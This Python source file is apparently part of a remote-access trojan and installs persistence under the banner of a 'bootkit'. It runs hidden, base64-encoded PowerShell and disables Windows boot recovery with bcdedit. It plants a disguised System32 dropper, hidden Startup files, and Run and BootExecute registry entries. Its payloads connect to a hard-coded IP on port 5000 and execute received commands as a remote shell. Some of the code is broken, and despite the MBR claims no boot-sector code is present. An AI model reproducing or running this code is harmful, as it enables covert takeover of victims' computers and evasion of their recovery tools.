"""
Boot Sector Infection (MBR)
Survives OS reinstall, loads before Windows
EXTREME CAUTION - Can brick system if done wrong
"""
import base64
import subprocess
import os
import ctypes


class BootkitInstaller:
    """Install bootkit in MBR"""

    def __init__(self, tel_logger_func=None):
        self.tel_logger = tel_logger_func

    def log(self, msg):
        print(msg)
        if self.tel_logger:
            self.tel_logger(msg)

    def is_uefi(self):
        """Check if system uses UEFI or Legacy BIOS"""
        try:
            result = subprocess.run(
                'powershell -Command "[System.Environment]::OSVersion.Platform -eq \'Win32NT\' -and (Get-ItemProperty -Path \'HKLM:\\System\\CurrentControlSet\\Control\' -Name \'PEFirmwareType\').PEFirmwareType -eq 2"',
                shell=True, capture_output=True, text=True
            )
            return "True" in result.stdout
        except:
            return False

    def backup_mbr(self):
        """Backup original MBR"""
        try:
            backup_path = os.path.join(os.getenv('APPDATA'), 'MicrosoftUpdate', 'mbr_backup.bin')

            # Read first sector (MBR)
            cmd = f'''
$mbr = New-Object byte[] 512
$disk = [System.IO.File]::Open('\\\\.\\\\PhysicalDrive0', 'Open', 'Read')
$disk.Read($mbr, 0, 512) | Out-Null
$disk.Close()
[System.IO.File]::WriteAllBytes('{backup_path}', $mbr)
'''

            ps_b64 = base64.b64encode(cmd.encode('utf-16le')).decode()
            result = subprocess.run(
                f'powershell -WindowStyle Hidden -EncodedCommand {ps_b64}',
                shell=True, capture_output=True
            )

            if os.path.exists(backup_path):
                self.log(f"[BOOTKIT] MBR backed up to {backup_path}")
                return True
            return False
        except Exception as e:
            self.log(f"[BOOTKIT] Backup failed: {e}")
            return False

    def install_mbr_payload(self):
        """Install payload in MBR (Legacy BIOS only)"""

        if self.is_uefi():
            self.log("[BOOTKIT] UEFI detected - MBR infection not applicable")
            return False

        # Backup first
        if not self.backup_mbr():
            self.log("[BOOTKIT] Cannot proceed without backup")
            return False

        # MBR payload (simplified - actual implementation would be assembly)
        # This payload chain-loads Windows, then loads our RAT

        ps_script = f'''
# Check admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
    Write-Output "Admin required"
    exit
}}

# Create bootkit dropper
$dropper = @'
@echo off
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemBootManager" /t REG_SZ /d "powershell -WindowStyle Hidden -Command \\"Start-Process python -ArgumentList '-c import socket; exec(socket.socket().connect((\\\"81.10.55.8\\\",5000)))' -WindowStyle Hidden\\"" /f
'@

$dropperPath = "$env:WINDIR\\System32\\bootmgr.bat"
$dropper | Out-File -FilePath $dropperPath -Encoding ASCII

# Modify boot configuration
bcdedit /set {{default}} bootstatuspolicy ignoreallfailures
bcdedit /set {{default}} recoveryenabled no

# Add to boot sequence
$bootKey = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
$currentValue = (Get-ItemProperty -Path $bootKey -Name "BootExecute").BootExecute
$newValue = $currentValue + "autocheck autochk *`0cmd /c $dropperPath"
Set-ItemProperty -Path $bootKey -Name "BootExecute" -Value $newValue

Write-Output "Bootkit installed"
'''

        import base64
        ps_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        cmd = f'powershell -WindowStyle Hidden -EncodedCommand {ps_b64}'

        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if "installed" in result.stdout.lower():
            self.log("[BOOTKIT] MBR payload installed successfully")
            return True
        else:
            self.log(f"[BOOTKIT] Installation failed: {result.stderr[:200]}")
            return False

    def install_safe_bootkit(self):
        """Safer bootkit installation (registry-based)"""

        # This is safer than modifying MBR directly
        # Uses Windows boot manager instead

        payload = f'''
@echo off
start /B powershell -WindowStyle Hidden -Command "python -c \\"import socket,subprocess,os; s=socket.socket(); s.connect(('81.10.55.8',5000)); s.send(b'PhantomLink'); [subprocess.run(s.recv(1024).decode(),shell=True) for _ in iter(int,1)]\\""
'''

        try:
            # Write payload to startup
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
                'SystemBootManager.bat'
            )

            with open(startup_path, 'w') as f:
                f.write(payload)

            # Make it hidden and system
            subprocess.run(f'attrib +h +s "{startup_path}"', shell=True, capture_output=True)

            # Add to boot registry
            subprocess.run(
                r'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "BootManager" /t REG_SZ /d "' + startup_path + '" /f',
                shell=True, capture_output=True
            )

            self.log("[BOOTKIT] Safe bootkit installed")
            return True

        except Exception as e:
            self.log(f"[BOOTKIT] Error: {e}")
            return False

    def install(self):
        """Install bootkit (tries safe method first)"""
        self.log("[BOOTKIT] Installing boot persistence...")

        # Try safe method first
        if self.install_safe_bootkit():
            return True

        # If admin and not UEFI, try MBR
        if ctypes.windll.shell32.IsUserAnAdmin():
            if not self.is_uefi():
                return self.install_mbr_payload()

        self.log("[BOOTKIT] Installation failed - insufficient privileges or UEFI system")
        return False